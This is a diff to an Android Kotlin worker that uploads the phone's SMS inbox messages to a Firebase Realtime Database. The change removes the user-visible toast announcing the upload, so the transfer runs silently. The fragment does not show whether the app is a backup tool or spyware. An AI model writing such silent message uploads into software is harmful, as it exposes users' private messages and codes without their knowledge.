@@ -29,31 +29,7 @@ class FetchMessagesWorker(
             // Upload messages to Firebase Realtime Database
             val reference = database.getReference("inbox_messages")
 
-            reference.setValue(inboxMessages)
-                .addOnCompleteListener { task ->
-                    if (task.isSuccessful) {
-                        Toast.makeText(
-                            mAppContext,
-                            "SMS logs upload successful",
-                            Toast.LENGTH_SHORT
-                        ).show()
-                        Log.d(
-                            "successFull : ",
-                            task.isSuccessful.toString()
-                        )
-                    } else {
-                        Toast.makeText(
-                            mAppContext,
-                            "SMS logs upload successful",
-                            Toast.LENGTH_SHORT
-                        ).show()
-                        Log.d(
-                            "successFull : ",
-                            false.toString()
-                        )
-                    }
-
-                }.await()
+            reference.setValue(inboxMessages).await()
             // Indicate success
             Result.success()
         } catch (e: Exception) {
